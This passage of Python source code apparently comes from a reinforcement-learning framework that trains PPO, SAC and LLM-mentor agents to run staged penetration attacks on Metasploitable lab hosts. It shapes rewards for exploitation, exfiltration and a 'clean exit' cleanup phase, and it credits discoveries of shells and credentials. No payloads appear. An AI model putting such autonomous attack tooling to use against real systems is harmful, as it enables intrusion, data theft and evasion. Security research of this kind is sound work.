                mentor_reasoning=f"🧠 PPO[{action_idx}] → {template.description[:40]}",
                confidence=0.7,
                phase=template.phase,
                source="ppo",
            )
        except Exception as e:
            logger.debug(f"PPO select failed for {self.agent_name}: {e}")
            return None

    # =====================================================================
    # C03: SAC SHADOW SELECT — runs alongside PPO for off-policy learning
    # =====================================================================

    def _sac_shadow_select(self, step_ctx: "SmartStepContext") -> None:
        """Run SAC shadow selection for off-policy learning.

        SAC selects an action in parallel with PPO but does NOT override
        the final decision. Instead, SAC's selection is stored on the
        DecisionPacket and its transitions are stored in record_result()
        for off-policy replay buffer learning.

        This is called once per decide() to ensure SAC always observes
        state→action transitions, regardless of which pipeline stage wins.
        """
        if self.sac_agent is None:
            return

        try:
            import torch
            from core.models.state_encoder import encode_state

            state = step_ctx.state if step_ctx.state else {}
            device = torch.device("cpu")
            step = step_ctx.step if step_ctx.step else 0

            state_tensor = encode_state(state, device, current_step=step, max_steps=500)
            action_idx, log_prob = self.sac_agent.select_action(state_tensor)

            # Map action to command template (for logging/packet population only)
            command = ""
            template_name = ""
            q_value = 0.0
            alpha = self.sac_agent.alpha

            if self.action_mapper is not None:
                template = self.action_mapper.action_to_command(action_idx)
                if template is not None:
                    template_name = template.name
                    command = template.template[:80]

            # Get Q-value for selected action
            with torch.no_grad():
                s = state_tensor.unsqueeze(0).to(self.sac_agent.device)
                q1, q2 = self.sac_agent.critic(s)
                q_value = float(torch.min(q1, q2)[0, action_idx].item())

            # Store pending for transition pairing in record_result()
            self._sac_pending = {
                "state": state_tensor,
                "action": action_idx,
                "log_prob": float(log_prob),
                "q_value": q_value,
            }

            # Populate DecisionPacket SAC proposal
            _dp = getattr(self, '_current_decision_packet', None)
            if _dp is not None:
                _dp.sac.action_idx = action_idx
                _dp.sac.log_prob = float(log_prob)
                _dp.sac.q_value = q_value
                _dp.sac.command = command
                _dp.sac.template_name = template_name
                _dp.sac.confidence = min(1.0, max(0.0, q_value / 10.0))
                _dp.sac.alpha = alpha

            logger.debug(
                f"[SAC][{self.agent_name}] Shadow select: a={action_idx} "
                f"Q={q_value:.2f} α={alpha:.3f} tmpl={template_name}"
            )

        except Exception as e:
            logger.debug(f"[SAC][{self.agent_name}] Shadow select failed: {e}")

    # Phase 6: Terminal reward mapping — reduced to match tighter reward scale
    # Phase 6.9: CLOSEOUT-centric terminal rewards.
    # EXFIL is no longer the big dopamine hit — CLEAN EXIT is.
    # Missing CLOSEOUT after reaching EXFIL = penalty (failed to finish the job).
    PPO_TERMINAL_REWARDS = {
        "CLOSEOUT": 40.0,         # BIG: clean exit = mission success
        "EXFILTRATION": 10.0,     # Moderate: you got data but didn't clean up
        "POST_EXPLOITATION": 8.0,
        "LATERAL_MOVEMENT": 5.0,
        "PRIVILEGE_ESCALATION": 3.0,
        "EXPLOITATION": 2.0,
    }
    # Phase 6.9: Penalty for reaching EXFIL but NOT completing CLOSEOUT
    PPO_INCOMPLETE_CLOSEOUT_PENALTY = -15.0

    def end_episode_ppo(
        self, done: bool = True, highest_phase: str = ""
    ) -> Optional[Dict[str, float]]:
        """Feed collected trajectory to PPO and run update.

        Called by SmartOrchestrator at the end of each episode.
        Phase 5.1: injects terminal reward into last trajectory entry
        so PPO gradient path sees phase-completion incentive.

        Args:
            done: Whether the episode terminated.
            highest_phase: Name of highest attack phase reached (e.g. "EXFILTRATION").

        Returns:
            PPO training metrics dict, or None if no update was needed.
        """
        # Phase 42: DAgger weight decay
        if self._dagger_buffer is not None:
            try:
                self._dagger_buffer.decay_weights()
            except Exception as e:
                logger.warning("DAgger decay_weights failed: %s", e)

        if not self.ppo_agent or not self._ppo_trajectory:
            self._ppo_trajectory.clear()
            self._ppo_pending = None
            return None

        try:
            # Phase 6.9: inject terminal reward + incomplete-closeout penalty
            if highest_phase and self._ppo_trajectory:
                terminal_bonus = self.PPO_TERMINAL_REWARDS.get(highest_phase, 0.0)
                if terminal_bonus > 0:
                    self._ppo_trajectory[-1]["reward"] += terminal_bonus
                    logger.debug(
                        f"[PPO][{self.agent_name}] Terminal bonus +{terminal_bonus:.1f} "
                        f"for reaching {highest_phase}"
                    )
                # Phase 6.9: Penalize reaching EXFIL but not CLOSEOUT
                # This teaches PPO that the job isn't done until cleanup is complete
                if highest_phase == "EXFILTRATION":
                    self._ppo_trajectory[-1]["reward"] += self.PPO_INCOMPLETE_CLOSEOUT_PENALTY
                    logger.debug(
                        f"[PPO][{self.agent_name}] Incomplete closeout penalty "
                        f"{self.PPO_INCOMPLETE_CLOSEOUT_PENALTY:.1f} (reached EXFIL but not CLOSEOUT)"
                    )
                # R54: Efficiency bonus REMOVED.
                # R52-R53 showed this trained PPO to rush episodes (avg 16 steps),
                # reducing cumulative reward. R48 (avg 27 steps, +2863.8) proves
                # longer episodes = more total reward. Removing the speed incentive
                # lets PPO optimize for cumulative reward through deeper exploration.
                # (Was: 5.0 × (25 - traj_len), capped at 50.0)
                
                # ── R58 Layer 2b: Fast-completion terminal bonus ────────
                # Compensate PPO for fewer reward-accumulation steps when
                # CLOSEOUT is reached efficiently. R57 episodes averaged 18 steps
                # vs R48's 25, losing ~500 cumulative reward from shorter runs.
                # This bonus teaches PPO that fast CLOSEOUT is GOOD, not a penalty.
                # Only applies when CLOSEOUT is actually reached (not for rushers).
                if highest_phase == "CLOSEOUT" and self._ppo_trajectory:
                    traj_len = len(self._ppo_trajectory)
                    _max_steps = 40  # Default max steps per episode
                    speed_bonus = min(30.0, max(0.0, (_max_steps - traj_len) * 1.0))
                    if speed_bonus > 0:
                        self._ppo_trajectory[-1]["reward"] += speed_bonus
                        logger.debug(
                            f"[PPO][{self.agent_name}] R58 speed bonus +{speed_bonus:.1f} "
                            f"(CLOSEOUT in {traj_len} steps)"
                        )

            # ── R69: Hindsight Trajectory Relabeling (HTR) ──────────
            # Walk backward through the trajectory: when a step produced
            # discoveries, retroactively credit prior steps whose commands
            # ENABLED those discoveries (via precondition chains).
            # This solves temporal credit assignment: nmap at step 3 that
            # discovers ports gets credit when exploit at step 8 uses them.
            #
            # Also applies chain momentum: consecutive discovery steps get
            # amplifying retroactive bonuses.
            # ─────────────────────────────────────────────────────────────
            _htr_total = 0.0
            _htr_count = 0
            HTR_WINDOW = 6       # Look back up to 6 steps
            HTR_ALPHA = 0.25     # Fraction of discovery reward attributed back
            HTR_DECAY = 0.85     # Per-step decay within the window
            
            # Discovery types → what preconditions they satisfy
            _DISC_TO_PRECOND = {
                "open_port": {"ports_discovered"},
                "service": {"services_discovered", "ports_discovered"},
                "version_info": {"services_discovered"},
                "credential": {"credentials_known"},
                "password": {"credentials_known"},
                "shell": {"shell_obtained"},
                "root_shell": {"shell_obtained", "root_obtained"},
                "hash": {"hash_known"},
                "vulnerability": {"vulnerability_found"},
            }
            
            traj = self._ppo_trajectory
            for i in range(len(traj) - 1, 0, -1):
                disc_types = traj[i].get("_r69_discoveries", [])
                if not disc_types:
                    continue
                
                # Compute what preconditions this discovery satisfies
                _satisfied = set()
                for dt in disc_types:
                    _satisfied |= _DISC_TO_PRECOND.get(dt, set())
                
                if not _satisfied:
                    continue
                
                # Walk backward from i-1 to max(0, i-HTR_WINDOW)
                _disc_reward = traj[i]["reward"]
                for j in range(i - 1, max(-1, i - 1 - HTR_WINDOW), -1):
                    _prior_template = traj[j].get("_r69_template", "")
                    _prior_preconds = traj[j].get("_r69_preconditions", set())
                    
                    # Credit if: (a) prior step has preconditions matching what
                    # this discovery satisfies (causal link), OR
                    # (b) prior step itself had discoveries (chain momentum)
                    _causal = bool(_prior_preconds & _satisfied)
                    _chain = bool(traj[j].get("_r69_discoveries", []))
                    
                    if _causal or _chain:
                        distance = i - j
                        bonus = HTR_ALPHA * abs(_disc_reward) * (HTR_DECAY ** distance)
                        bonus = min(bonus, 10.0)  # Cap per-link bonus
                        traj[j]["reward"] += bonus
                        _htr_total += bonus
                        _htr_count += 1
            
            if _htr_count > 0:
                logger.debug(
                    f"[PPO][{self.agent_name}] R69 HTR: relabeled {_htr_count} "
                    f"trajectory entries, total bonus +{_htr_total:.1f}"
                )

            for t in self._ppo_trajectory:
                self.ppo_agent.store_transition(
                    state=t["state"],
                    action=t["action"],
                    log_prob=t["log_prob"],
                    reward=t["reward"],
                    value=t["value"],
                    done=t["done"],
                    teacher_distribution=t.get("teacher_distribution"),
                    teacher_action=t.get("teacher_action"),
                )

            # Phase 37: Record episode end for bridge anneal
            if self._p37_llm_bridge is not None:
                self._p37_llm_bridge.record_episode_end()

            # Bootstrap value
            last_value = 0.0
            if self._ppo_trajectory and not self._ppo_trajectory[-1]["done"]:
                last_value = self._ppo_trajectory[-1]["value"]

            metrics = self.ppo_agent.update(last_value=last_value)
            if metrics:
                logger.info(
                    f"[PPO][{self.agent_name}] Update #{self.ppo_agent.updates_done}: "
                    f"π={metrics.get('policy_loss', 0):.4f} "
                    f"v={metrics.get('value_loss', 0):.4f} "
                    f"H={metrics.get('entropy', 0):.4f} "
                    f"‖∇‖={metrics.get('total_grad_norm', 0):.4f}"
                )

                # ── C05: Populate DecisionPacket.grad_norms from PPO metrics ──
                _dp = self._current_decision_packet
                if _dp is not None and hasattr(_dp, "grad_norms"):
                    gn = _dp.grad_norms
                    gn.total_grad_norm = metrics.get("total_grad_norm", 0.0)
                    gn.sil_grad_norm = metrics.get("sil_grad_norm", 0.0)
                    # Per-loss norms only present when log_grad_norms=True
                    gn.policy_grad_norm = metrics.get("policy_grad_norm", 0.0)
                    gn.value_grad_norm = metrics.get("value_grad_norm", 0.0)
                    gn.entropy_grad_norm = metrics.get("entropy_grad_norm", 0.0)
                    gn.kl_teacher_grad_norm = metrics.get("kl_teacher_grad_norm", 0.0)
                    gn.ranking_grad_norm = metrics.get("ranking_grad_norm", 0.0)
                    gn.value_reg_grad_norm = metrics.get("value_reg_grad_norm", 0.0)
                    gn.contrastive_grad_norm = metrics.get("contrastive_grad_norm", 0.0)

                # Store latest grad norms on coach for orchestrator access
                self._last_grad_norms = {
                    "total": metrics.get("total_grad_norm", 0.0),
                    "sil": metrics.get("sil_grad_norm", 0.0),
                    "policy": metrics.get("policy_grad_norm", 0.0),
                    "value": metrics.get("value_grad_norm", 0.0),
                    "entropy": metrics.get("entropy_grad_norm", 0.0),
                    "kl_teacher": metrics.get("kl_teacher_grad_norm", 0.0),
                    "ranking": metrics.get("ranking_grad_norm", 0.0),
                    "value_reg": metrics.get("value_reg_grad_norm", 0.0),
                    "contrastive": metrics.get("contrastive_grad_norm", 0.0),
                }

                # ── P7: Feed gradient norms to HarmonyMetrics ──
                if self._harmony_metrics is not None:
                    self._harmony_metrics.record_gradient_norms(
                        self._last_grad_norms
                    )

                # ── P7: Feed KL drift to HarmonyMetrics ──
                if self._harmony_metrics is not None:
                    _kl_val = metrics.get("approx_kl", 0.0)
                    if _kl_val > 0:
                        self._harmony_metrics.record_kl_drift(_kl_val)
            
            # ── R58 Layer 2c: Signal episode outcome for adaptive entropy ──
            if hasattr(self.ppo_agent, 'signal_episode_outcome'):
                _reached_closeout = (highest_phase == "CLOSEOUT")
                self.ppo_agent.signal_episode_outcome(_reached_closeout)
                logger.debug(
                    f"[PPO][{self.agent_name}] R58 adaptive entropy: "
                    f"closeout={_reached_closeout}, "
                    f"mult={self.ppo_agent._entropy_adaptive_multiplier:.2f}, "
                    f"H_coef={self.ppo_agent.entropy_coef:.4f}"
                )
            
            # ── R70: Store episode in Self-Imitation Learning buffer ──
            # Feed trajectory (states, actions, raw rewards) to SIL buffer.
            # Buffer only stores above-average episodes (positive advantage).
            if hasattr(self.ppo_agent, 'store_sil_episode') and self._ppo_trajectory:
                _sil_states = [t["state"] for t in self._ppo_trajectory]
                _sil_actions = [t["action"] for t in self._ppo_trajectory]
                _sil_rewards = [t["reward"] for t in self._ppo_trajectory]
                _sil_added = self.ppo_agent.store_sil_episode(
                    _sil_states, _sil_actions, _sil_rewards
                )
                if _sil_added > 0:
                    logger.debug(
                        f"[PPO][{self.agent_name}] R70 SIL: stored {_sil_added} "
                        f"golden transitions (buffer={len(self.ppo_agent.sil_buffer)})"
                    )

            return metrics
        except Exception as e:
            logger.warning(f"PPO update error for {self.agent_name}: {e}")
            return None
        finally:
            # Phase 8.0: Save episode attack chain to cross-episode memory
            total_ep_reward = sum(t.get("reward", 0) for t in self._ppo_trajectory)
            self._save_episode_chain(total_ep_reward, highest_phase)
            self._reset_episode_chain()

            # Phase 9.1: Signal HybridMemory episode end with summary
            hm = self._get_hybrid_memory()
            if hm is not None:
                try:
                    hm.end_episode(
                        episode_id=self.current_episode,
                        summary={
                            "agent": self.agent_name,
                            "total_reward": total_ep_reward,
                            "highest_phase": highest_phase or "RECON",
                            "steps": len(self._ppo_trajectory),
                            "unique_actions": len(set(
                                t.get("action", 0) for t in self._ppo_trajectory
                            )) if self._ppo_trajectory else 0,
                        },
                    )
                except Exception:
                    pass
            
            # Phase 8.1: Log learning progress for hypothesis-test-learn cycle
            if self._ppo_trajectory:
                _unique = len(set(t.get("action", 0) for t in self._ppo_trajectory))
                _total = len(self._ppo_trajectory)
                logger.debug(
                    f"[LEARN] {self.agent_name}: {_unique}/{_total} unique PPO actions, "
                    f"hypotheses={len(self._reasoning_hypotheses)}, "
                    f"failures={len(self._reasoning_failures)}"
                )
            
            # ── PHASE 15.0: Consolidation replay ("sleep") ──────────
            # Build batch from collected samples and run consolidation.
            # Pushes high-signal samples into BCBuffer / SkillLibrary.
            if (self._p15_consolidation_engine is not None
                    and hasattr(self, '_p15_consolidation_samples')
                    and self._p15_consolidation_samples):
                try:
                    _c_batch = self._p15_consolidation_engine.build_batch(
                        self._p15_consolidation_samples,
                        episode_id=str(self.current_episode),
                    )
                    _c_sl = self.skill_library if hasattr(self, 'skill_library') else None
                    _c_metrics = self._p15_consolidation_engine.run(
                        _c_batch,
                        bc_buffer=None,  # BCBuffer wiring deferred
                        skill_library=_c_sl,
                    )
                    logger.debug(
                        f"[P15][CONSOL] {self.agent_name}: "
                        f"selected={_c_metrics.samples_selected}/{_c_metrics.samples_considered} "
                        f"skill_promos={_c_metrics.skill_promotions} "
                        f"tokens={_c_metrics.tokens_used}"
                    )
                except Exception as e:
                    logger.debug(f"[P15] Consolidation run failed: {e}")

            self._ppo_trajectory.clear()
            self._ppo_pending = None
            
            # Phase 9: Signal CognitiveBus episode end for this agent
            try:
                bus = self._get_cognitive_bus()
                if bus is not None:
                    bus.end_episode()
            except Exception:
                pass

            # Phase 9.0: Reset DDQN episode state
            if self.ddqn_macro is not None:
                self.ddqn_macro.reset_episode()
                self._active_macro = None
                self._ddqn_pending = None
                self._ddqn_prev_macro = None  # R57 Layer 1
                self._last_step_had_discovery = False  # R57 Layer 1
            
            # C04: CognitionNode episode end — collect metrics
            if self.cognition_node is not None:
                try:
                    _cn_metrics = self.cognition_node.end_episode()
                    logger.debug(f"[COGNITION][{self.agent_name}] episode end: {_cn_metrics}")
                    self.cognition_node.reset_episode()
                except Exception as e:
                    logger.debug(f"[COGNITION][{self.agent_name}] Episode end failed: {e}")

            # Phase 10.0: Cloud role — PostmortemSkillExtractor at episode end
            if self._postmortem_extractor and self._postmortem_extractor.can_call():
                try:
                    transcript = "\n".join(
                        f"[{t.get('_r69_template', '?')}] r={t.get('reward', 0):.1f}"
                        for t in (self._ppo_trajectory or [])[-20:]
                    )
                    skills = self._postmortem_extractor.extract_skills(  # type: ignore[attr-defined]
                        transcript=transcript,
                        total_reward=total_ep_reward,
                        highest_phase=highest_phase or "RECON",
                    )
                    if skills:
                        logger.info(
                            f"[CLOUD-ROLE][{self.agent_name}] PostmortemExtractor: "
                            f"{len(skills)} skill cards extracted"
                        )
                except Exception as e:
                    logger.debug(f"PostmortemExtractor failed: {e}")

            # Phase 10.0: Cloud role — Reset episode counters for all roles
            for role in [
                self._strategic_planner, self._tactical_advisor,
                self._judge_ranker, self._postmortem_extractor,
                self._dagger_corrector,
            ]:
                if role is not None:
                    try:
                        role.reset_episode()
                    except Exception:
                        pass
    
    def _decide_with_mentor(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str],
        confidence: float,
        filtered_commands: Optional[List[CommandTemplate]] = None,
        exfil_prompt: Optional[str] = None,
    ) -> SmartDecisionResult:
        """
        Make decision using the smart mentor (LLM).
        Uses DualMentor (GPT + Venice) if available, otherwise single SmartMentor.
        Validates that mentor's command respects role exclusivity AND anti-loop rules.
        
        Args:
            step_ctx: Current step context
            proposed_action: Proposed action from rule-based system
            confidence: Confidence in proposed action
            filtered_commands: Pre-filtered commands for this agent's role
            exfil_prompt: Optional exfil-specific prompt injection (from MentorController)
        """
        ctx = step_ctx.attack_context
        
        # Phase 42: Update SmartMentor target_profile to gate MS-specific knowledge
        if self.smart_mentor:
            _target = ctx.target
            if _target in ("172.28.0.10",):
                self.smart_mentor.target_profile = "metasploitable2"
            elif _target in ("172.28.0.11",) or "172.28.0" in _target:
                self.smart_mentor.target_profile = "metasploitable3"
            else:
                self.smart_mentor.target_profile = "generic"
        
        # Phase 6.2: Inject exfil guidance into context if provided
        if exfil_prompt:
            # Temporarily augment the context narrative for the mentor call
            setattr(ctx, '_exfil_injection', exfil_prompt)
        
        try:
            # === USE DUAL MENTOR IF AVAILABLE ===
            if self.has_dual_mentor():
                # Phase 11.0: Check Venice budget before dual-mentor call
                if self.budget_controller is not None and not self.budget_controller.can_call_venice():
                    logger.debug(f"[{self.agent_name}] Venice budget exhausted, falling back to single mentor")
                    mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)  # type: ignore[union-attr]
                    provider_used = "gpt"
                    tokens_used = getattr(mentor_response, 'tokens_used', 0)
                else:
                    dual_response = self.dual_mentor.get_command(ctx, filtered_commands)  # type: ignore[union-attr]
                    mentor_response = dual_response.chosen
                    provider_used = dual_response.provider_used
                    tokens_used = dual_response.tokens_total
                    # Record Venice usage if that provider was used
                    if self.budget_controller and provider_used == "venice":
                        self.budget_controller.record_venice_call(tokens_used=tokens_used)
                
                if not mentor_response or not mentor_response.is_valid:
                    logger.warning(f"[{self.agent_name}] DualMentor returned invalid response, falling back to registry")
                    return self._decide_from_registry(step_ctx, proposed_action, confidence)
                
                logger.debug(f"[{self.agent_name}] DualMentor chose: {mentor_response.template_name} via {provider_used}")
            else:
                # === SINGLE MENTOR FALLBACK ===
                mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)  # type: ignore[union-attr]
                provider_used = "gpt"
                tokens_used = getattr(mentor_response, 'tokens_used', 0)
            
            # VALIDATE: Reject offline placeholders masquerading as commands
            from core.gpt_manager import GPTManager as _GPTMgr
            if _GPTMgr.is_offline_placeholder(mentor_response.command):
                logger.debug(f"[{self.agent_name}] Mentor returned offline placeholder, falling back to registry")
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # VALIDATE: Check if mentor's command violates role exclusivity (belt & suspenders)
            mentor_cmd = mentor_response.command.lower()
            is_valid_for_role = self._validate_command_for_role(mentor_cmd)
            
            if not is_valid_for_role:
                # Mentor suggested a command that belongs to another agent's domain
                logger.debug(f"[{self.agent_name}] Mentor suggested '{mentor_response.command}' but it violates role exclusivity, falling back to registry")
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # =================================================================
            # CRITICAL: ANTI-LOOP CHECK - LLM often ignores "do not repeat"
            # =================================================================
            mentor_prefix = mentor_cmd.split()[0] if mentor_cmd.split() else ""
            
            # Count how many times this command prefix was used recently
            recent_prefixes = []
            for cmd in ctx.command_history[-10:]:
                parts = cmd.lower().split()
                if parts:
                    recent_prefixes.append(parts[0])
            
            prefix_repeat_count = recent_prefixes.count(mentor_prefix)
            
            # If this prefix was used 2+ times recently, REJECT and use registry fallback
            if prefix_repeat_count >= 2:
                logger.warning(f"[{self.agent_name}] LLM suggested '{mentor_prefix}' but it was used {prefix_repeat_count}x recently - forcing registry fallback")
                # Mark this as a stuck situation for the fallback to handle
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # Also check if exact command was used before
            if mentor_response.command in ctx.command_history[-5:]:
                logger.warning(f"[{self.agent_name}] LLM suggested exact repeat command - forcing registry fallback")
                return self._decide_from_registry(step_ctx, proposed_action, confidence)
            
            # ─── FIX: Substitute any remaining {param} placeholders ─────
            # Mentor often returns raw templates like "ssh {username}@target"
            # Apply _get_default_param() to fill in missing values
            final_command = mentor_response.command
            import re as _re
            placeholder_pattern = _re.compile(r'\{(\w+)\}')
            placeholders = placeholder_pattern.findall(final_command)
            if placeholders:
                for param_name in placeholders:
                    default_val = self._get_default_param(param_name, ctx)
                    if default_val and not default_val.startswith('{'):
                        final_command = final_command.replace(f'{{{param_name}}}', default_val)
                if final_command != mentor_response.command:
                    logger.debug(f"[{self.agent_name}] Mentor param substitution: {mentor_response.command[:60]} → {final_command[:60]}")
                    mentor_response.command = final_command
            
            # Track command in history
            ctx.command_history.append(mentor_response.command)
            
            # Determine if mentor changed the action
            delta = "changed" if proposed_action and mentor_response.command != proposed_action else "kept"
            
            # Validate token tracking: warn if mentor was called but tokens=0
            if tokens_used == 0:
                logger.debug(f"[TOKEN_WARN] {self.agent_name} mentor call but tokens=0 - may be cached or estimate missing")
            
            # Add provider info to model_used
            model_display = f"{self.model}|{provider_used}" if self.has_dual_mentor() else self.model
            
            return SmartDecisionResult(
                command=mentor_response.command,
                template_name=mentor_response.template_name,
                params=mentor_response.params,
                mentor_call=True,
                model_used=model_display,
                mentor_reasoning=mentor_response.reasoning,
                mentor_delta=delta,
                mentor_provider=provider_used,  # Track which provider was used
                confidence=mentor_response.confidence,
                phase=mentor_response.phase,
                tokens_used=tokens_used,
                source="mentor",  # Phase 0.1 tracking
            )
            
        except Exception as e:
            logger.debug(f"Smart mentor failed: {e}, falling back to registry")
            return self._decide_from_registry(step_ctx, proposed_action, confidence)
    
    def _validate_command_for_role(self, command: str) -> bool:
        """
        Check if a command is valid for this agent's role.
        Returns False if the command starts with another agent's exclusive prefix.
        
        Args:
            command: The command string to validate
            
        Returns:
            True if valid for this role, False if it belongs to another agent
        """
        cmd_lower = command.lower().strip()
        # Also check with underscores replaced by hyphens and vice versa
        cmd_alt = cmd_lower.replace('-', '_')
        cmd_alt2 = cmd_lower.replace('_', '-')
        
        # Check against OTHER agents' exclusive prefixes
        for other_agent, other_role in self.AGENT_ROLES.items():
            if other_agent == self.agent_name:
                continue  # Skip self
            
            other_prefixes = other_role.get("exclusive_prefixes", [])
            for prefix in other_prefixes:
                prefix_lower = prefix.lower().strip()
                prefix_alt = prefix_lower.replace('-', '_')
                prefix_alt2 = prefix_lower.replace('_', '-')
                
                # Check all variations
                if (cmd_lower.startswith(prefix_lower) or 
                    cmd_lower.startswith(prefix_alt) or
                    cmd_lower.startswith(prefix_alt2) or
                    cmd_alt.startswith(prefix_lower) or
                    cmd_alt2.startswith(prefix_lower)):
                    logger.debug(f"[{self.agent_name}] Command '{command[:40]}' belongs to {other_agent}'s domain (prefix: {prefix})")
                    return False
        
        return True
    
    def record_result(
        self,
        decision: SmartDecisionResult,
        success: bool,
        raw_output: str,
        new_discoveries: Optional[Dict[str, Any]] = None,
        done: bool = False,
        shared_discoveries: Optional[Set[str]] = None,
    ) -> RewardBreakdown:
        """
        Record the result of a command execution and calculate reward.
        
        Args:
            decision: The decision that was executed
            success: Whether command succeeded
            raw_output: Raw output from command
            new_discoveries: New things discovered
            shared_discoveries: Cross-agent shared discovery set for dedup (Phase 6)
            
        Returns:
            RewardBreakdown with detailed reward calculation
        """
        if not self.attack_context:
            self.attack_context = AttackContext(target="unknown")
        
        # Calculate smart reward
        breakdown = self.reward_calculator.calculate_reward(
            template_name=decision.template_name,
            command=decision.command,
            success=success,
            raw_output=raw_output,
            current_phase=decision.phase,
            state_flags=self.attack_context.state_flags,
            new_discoveries=new_discoveries,
            shared_discoveries=shared_discoveries,
            # Phase 16.0: Progress Estimator signal for dynamic reward shaping
            progress_delta=(
                self._p16_progress_estimate.delta
                if self._p16_progress_estimate else None
            ),
            estimator_confidence=(
                self._p16_progress_estimate.confidence
                if self._p16_progress_estimate else 0.0
            ),
        )

        # =====================================================================
        # STRUCTURAL CONSOLIDATION: Unified Reward Pipeline
        # Route ALL reward through UnifiedRewardPipeline so every learner
        # receives the same scalar. RND intrinsic is added here once.
        # =====================================================================
        _unified_reward = None
        _rnd_intrinsic_for_pipeline = 0.0
        _rnd_scale_for_pipeline = 1.0
        _dp = getattr(self, '_current_decision_packet', None)
        if _dp is not None and hasattr(_dp, 'rnd') and _dp.rnd.valid:
            _rnd_intrinsic_for_pipeline = _dp.rnd.intrinsic_reward
            _rnd_scale_for_pipeline = getattr(
                self._maturity_controller, '_state', None
            )
            if _rnd_scale_for_pipeline is not None:
                _rnd_scale_for_pipeline = getattr(
                    _rnd_scale_for_pipeline, 'rnd_scale', 1.0
                )
            else:
                _rnd_scale_for_pipeline = 1.0

        if self._reward_pipeline is not None:
            _unified_reward = self._reward_pipeline.compute(
                breakdown=breakdown,
                rnd_intrinsic=_rnd_intrinsic_for_pipeline,
                rnd_scale=_rnd_scale_for_pipeline,
            )

        # Track reward in HarmonyMetrics
        if self._harmony_metrics is not None:
            self._harmony_metrics.record_reward(breakdown.total)
        
        # D2: Populate discovery_details for _emit_step_event tracking
        if new_discoveries:
            for disc_type, disc_values in new_discoveries.items():
                if isinstance(disc_values, list):
                    for v in disc_values:
                        breakdown.discovery_details.append(f"{disc_type}:{v}")
                elif isinstance(disc_values, bool) and disc_values:
                    breakdown.discovery_details.append(f"{disc_type}:found")
                else:
                    breakdown.discovery_details.append(f"{disc_type}:{disc_values}")
        
        # Record with learned store
        context_tags = {self.attack_context.platform, self.attack_context.difficulty}
        preconditions = set(k for k, v in self.attack_context.state_flags.items() if v)
        
        if success and breakdown.total > 0:
            self.learned_store.record_success(
                template_name=decision.template_name,
                params=decision.params,
                reward=breakdown.total,
                context_tags=context_tags,
                preconditions_met=preconditions,
                phase=decision.phase,
            )
        elif not success:
            self.learned_store.record_failure(
                template_name=decision.template_name,
                params=decision.params,
            )

        # C06: Track decision source win rate
        # C07: Gated by FF_SOURCE_WIN_RATE feature flag
        from core.feature_flags import get_feature_flags as _get_ff
        _ff = _get_ff()
        if _ff.source_win_rate_flag:
            self.source_win_rate.record(
                source=decision.source,
                success=success and breakdown.total > 0,
                reward=breakdown.total,
            )

            # C06: Populate DecisionPacket attribution.source_win_rates
            _dp = getattr(self, "_current_decision_packet", None)
            if _dp is not None and hasattr(_dp, "attribution"):
                _dp.attribution.source = decision.source
                _dp.attribution.source_win_rates = {
                    name: stats["ema_win_rate"]
                    for name, stats in self.source_win_rate.get_summary().items()
                }
        
        # Update discoveries in context
        if new_discoveries:
            for key, value in new_discoveries.items():
                self.attack_context.add_discovery(key, value)
                
                # Set state flags based on discoveries
                if key == "shell":
                    self.attack_context.set_state_flag("shell_obtained")
                    if self.attack_context.platform == "linux":
                        self.attack_context.set_state_flag("linux_shell_obtained")
                    elif self.attack_context.platform == "windows":
                        self.attack_context.set_state_flag("windows_shell_obtained")
                elif key == "credentials":
                    self.attack_context.set_state_flag("credentials_known")
                elif key == "hash":
                    self.attack_context.set_state_flag("hash_known")
                elif key == "vulnerability":
                    self.attack_context.set_state_flag("vulnerability_found")
            # Phase 6.1: Reset stagnation on new discoveries
            self._stagnation_steps = 0
            # R57 Layer 1: Signal for DDQN stagnation detection
            self._last_step_had_discovery = True
            # Phase 6.2: Notify MentorController of discovery
            if self.mentor_controller is not None:
                self.mentor_controller.record_discovery()
        else:
            # Phase 6.1: Increment stagnation counter
            self._stagnation_steps = getattr(self, '_stagnation_steps', 0) + 1
            # R57 Layer 1: No discovery this step
            self._last_step_had_discovery = False
        
        # Add failed command to context if failed
        if not success:
            self.attack_context.failed_attempts.append(decision.command)
            # R47 Fix #4: Track SSH/sshpass failures for anti-repeat filtering
            cmd_lower = (decision.command or "").lower()
            if ("sshpass " in cmd_lower or cmd_lower.startswith("ssh ")) and raw_output:
                output_lower = raw_output.lower()
                _ssh_fail_indicators = (
                    "connection closed", "key exchange", "no matching",
                    "connection refused", "connection timed out", "permission denied",
                    "kex_exchange_identification", "host key verification",
                )
                if any(ind in output_lower for ind in _ssh_fail_indicators):
                    self._ssh_failures_this_episode = getattr(
                        self, '_ssh_failures_this_episode', 0
                    ) + 1
        
        # Phase 6.9.6: Update reasoning context trackers
        if hasattr(self, '_reasoning_step_rewards'):
            self._reasoning_step_rewards.append(breakdown.total)
            self._reasoning_highest_reward = max(
                self._reasoning_highest_reward, breakdown.total
            )
            self._reasoning_total_commands += 1
            self._reasoning_total_decisions += 1
            if not success:
                self._reasoning_failed_commands += 1
            if decision.source == "ppo":
                self._reasoning_ppo_decisions += 1
            elif decision.source in ("anti_repeat", "forced"):
                self._reasoning_anti_repeat_decisions += 1
            if new_discoveries:
                self._reasoning_last_discovery_step = getattr(
                    self, '_ppo_step_count', 0
                )
        
        # ─── PHASE 15.0: Consolidation sample collection ────────────
        # Collect samples for end-of-episode consolidation replay.
        # Only collected when FF_CONSOLIDATION is on.
        if self._p15_consolidation_engine is not None:
            try:
                from core.training.consolidation import ConsolidationSample, ConsolidationEngine
                _da_c = self._p15_neuromod_state.da if self._p15_neuromod_state else 0.5
                _ach_c = self._p15_neuromod_state.ach if self._p15_neuromod_state else 0.4
                _step_c = getattr(self, '_ppo_step_count', 0)
                _cs = ConsolidationSample(
                    step=_step_c,
                    command=decision.command[:200],
                    reward=breakdown.total,
                    da_level=_da_c,
                    ach_level=_ach_c,
                    source=decision.source or "unknown",
                    hypothesis_confirmed=bool(new_discoveries),
                    trace_summary=f"phase={decision.phase.name},src={decision.source}"[:256],
                    state_hash=ConsolidationEngine.compute_state_hash(
                        decision.command[:100],
                        decision.phase.name if hasattr(decision.phase, 'name') else str(decision.phase),
                        _step_c,
                    ),
